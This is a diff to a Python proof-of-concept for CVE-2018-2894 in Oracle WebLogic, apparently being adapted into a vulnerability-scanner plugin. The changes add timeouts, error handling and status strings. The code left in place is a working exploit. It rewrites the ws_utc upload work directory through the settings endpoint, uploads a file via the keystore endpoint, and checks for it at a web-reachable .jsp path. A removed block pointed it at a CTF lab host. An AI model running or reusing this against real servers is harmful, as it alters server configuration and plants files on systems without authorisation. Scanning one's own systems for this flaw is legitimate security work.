@@ -6,18 +6,18 @@ import requests
 import xml.etree.ElementTree as ET
 
 
-def get_current_work_path(host):
+def get_current_work_path(host, timeout=10):
     geturl = host + "/ws_utc/resources/setting/options/general"
     ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
     values = []
     try:
-        request = requests.get(geturl)
+        request = requests.get(geturl, timeout=timeout)
         if request.status_code == 404:
-            exit("[-] {}  don't exists CVE-2018-2894".format(host))
+            raise Exception("[-] {}  don't exists CVE-2018-2894".format(host))
         elif "Deploying Application".lower() in request.text.lower():
             print("[*] First Deploying Website Please wait a moment ...")
             time.sleep(20)
-            request = requests.get(geturl, headers=ua)
+            request = requests.get(geturl, headers=ua, timeout=timeout)
         if b"</defaultValue>" in request.content:
             root = ET.fromstring(request.content)
             value = root.find("section").find("options")
@@ -26,16 +26,19 @@ def get_current_work_path(host):
                     if e.tag == "parameter" and sub.tag == "defaultValue":
                         values.append(sub.text)
     except requests.ConnectionError:
-        exit("[-] Cannot connect url: {}".format(geturl))
+        raise Exception("[-] Cannot connect url: {}".format(geturl))
+    except Exception as e:
+        raise Exception(str(e))
+        
     if values:
         return values[0]
     else:
-        print("[-] Cannot get current work path\n")
-        exit(request.content)
+        # print("[-] Cannot get current work path\n")
+        raise Exception("[-] Cannot get current work path")
 
 
-def get_new_work_path(host):
-    origin_work_path = get_current_work_path(host)
+def get_new_work_path(host, timeout=10):
+    origin_work_path = get_current_work_path(host, timeout)
     works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
     if "user_projects" in origin_work_path:
         if "\\" in origin_work_path:
@@ -51,11 +54,11 @@ def get_new_work_path(host):
             current_work_home += "/" + domain_name + works
     else:
         current_work_home = origin_work_path
-        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
+        # print("[*] cannot handle current work home dir: {}".format(origin_work_path))
     return current_work_home
 
 
-def set_new_upload_path(host, path):
+def set_new_upload_path(host, path, timeout=10):
     data = {
         "setting_id": "general",
         "BasicConfigOptions.workDir": path,
@@ -64,18 +67,22 @@ def set_new_upload_path(host, path):
     headers = {
         'Content-Type': 'application/x-www-form-urlencoded',
         'X-Requested-With': 'XMLHttpRequest', }
-    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers)
+    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers, timeout=timeout)
     if b"successfully" in request.content:
         return True
     else:
-        print("[-] Change New Upload Path failed")
-        exit(request.content)
+        # print("[-] Change New Upload Path failed")
+        raise Exception("Change New Upload Path failed")
 
 
-def poc(url, username):
+def poc(url, timeout=10):
+    username = "admin"
+    if url.endswith('/'): url = url[:-1]
+    
     try:
         vulnurl = "/ws_utc/resources/setting/keystore"
-        set_new_upload_path(url, get_new_work_path(url))
+        new_work_path = get_new_work_path(url, timeout)
+        set_new_upload_path(url, new_work_path, timeout)
         upload_content = username + " test"
         files = {
             "ks_edit_mode": "false",
@@ -87,29 +94,19 @@ def poc(url, username):
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-Requested-With': 'XMLHttpRequest', }
 
-        request = requests.post(url + vulnurl, files=files)
+        request = requests.post(url + vulnurl, files=files, timeout=timeout)
         response = request.text
         match = re.findall("<id>(.*?)</id>", response)
         if match:
             tid = match[-1]
             shell_path = url + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
-            if bytes(upload_content, encoding="utf8") in requests.get(shell_path, headers=headers).content:
+            if bytes(upload_content, encoding="utf8") in requests.get(shell_path, headers=headers, timeout=timeout).content:
                 print("[+] {} exists CVE-2018-2894".format(url))
                 print("[+] Check URL: {} ".format(shell_path))
-                return True
+                return True, 'WebLogic CVE-2018-2894: 存在漏洞'
             else:
-                print("[-] {}  don't exists CVE-2018-2894".format(url))
+                return False, 'WebLogic CVE-2018-2894: 安全'
         else:
-            print("[-] {}  don't exists CVE-2018-2894".format(url))
-    except:
-        return False
-    return False
-
-
-if __name__ == "__main__":
-    username = "weblogic1"
-    url = "http://node3.buuoj.cn:27291"
-    # url = "http://127.0.0.1:7001"
-    print(poc(url, username))
-
-
+             return False, 'WebLogic CVE-2018-2894: 安全'
+    except Exception as e:
+        return False, f'WebLogic CVE-2018-2894: 扫描失败 - {str(e)}'
